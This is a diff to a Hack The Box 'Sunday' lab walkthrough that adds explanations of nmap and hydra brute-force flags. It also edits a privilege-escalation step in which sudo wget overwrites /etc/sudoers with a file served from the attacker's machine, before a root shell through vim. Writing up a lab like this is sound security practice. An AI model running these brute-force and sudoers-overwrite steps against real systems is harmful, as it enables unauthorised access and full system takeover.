@@ -88,6 +88,8 @@ Nmap done: 1 IP address (1 host up) scanned in 867.94 seconds
 kali@kali:~/htb/Sunday$
 ```
 
+-p- just selects all ports. And --max-retries just ensures that we wont miss out on information just because the service is unstable.
+
 Ok. Let’s see if we can get some more information from those ports.
 
 ```
@@ -134,6 +136,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-30 19:50:
 kali@kali:~/htb/Sunday$
 
 ```
+
+-f stops when a match is found
+
+-v prints more verbose informaion, like all combos being tried.
+
+-V prints more verbose information about how hydra is running, Wether the addresses are resolved etc.
+
+-I just makes it so hydra does not restart the previous search. It's useful for making sure hydra runs right. 
+
+-s to select unusual ports
+
+-t selects how many threads to use. 4 is reccommended for ssh.
 
 And we got a hit, almost 30 minutes in. I wonder if there was another way to get the password except just guessing the password from the box name, which I feel is slightly cheap.
 
@@ -353,7 +367,7 @@ Serving HTTP on 0.0.0.0 port 8000 ...
 And then to download and replace:
 
 ```
-sunny@sunday:/$ sudo wget -O /etc/sudoers http://10.10.14.69:8000/new_sudoers --output-document=/etc/sudoers
+sunny@sunday:/$ sudo wget -O /etc/sudoers http://10.10.14.69:8000/new_sudoers
 --07:22:41--  http://10.10.14.69:8000/new_sudoers
            => `/etc/sudoers'
 Connecting to 10.10.14.69:8000... connected.
@@ -364,6 +378,9 @@ Length: 841 [application/octet-stream]
 
 07:22:41 (95.70 MB/s) - `/etc/sudoers' saved [841/841]
 ```
+
+-O file means that all information w-gotten will be truncated to that file. So we are essentially replacing the sudoers file.
+
 
 And now we can use vim to get a root shell:
 
